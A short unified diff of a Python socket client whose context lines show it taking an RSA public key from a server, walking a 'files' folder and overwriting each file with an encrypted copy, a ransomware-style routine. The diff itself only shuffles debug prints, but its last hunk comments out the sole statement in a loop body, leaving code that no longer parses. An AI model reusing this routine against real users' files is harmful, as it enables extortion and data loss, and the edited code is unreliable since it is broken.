@@ -67,7 +67,6 @@ def connection(server_socket):
                 public_key = RSA.importKey(public_key)
 
                 for root, _, files in os.walk('files'):
-                    print('asdf')
                     for filename in files:
                         print('ENCRYPT FILE:', filename)
                         
@@ -78,6 +77,7 @@ def connection(server_socket):
                         output_file = open(root + "/" + filename, 'wb')
                         output_file.write(data)
                         output_file.close()
+                        print('asdf')
 
             elif message_type == 'WRONG_PASSWORD':
                 pass
@@ -89,7 +89,7 @@ def connection(server_socket):
             print('the end')
 
         for conn in writable:
-            print('halllååå?!??!?!')
+            #print('halllååå?!??!?!')
 
         
 
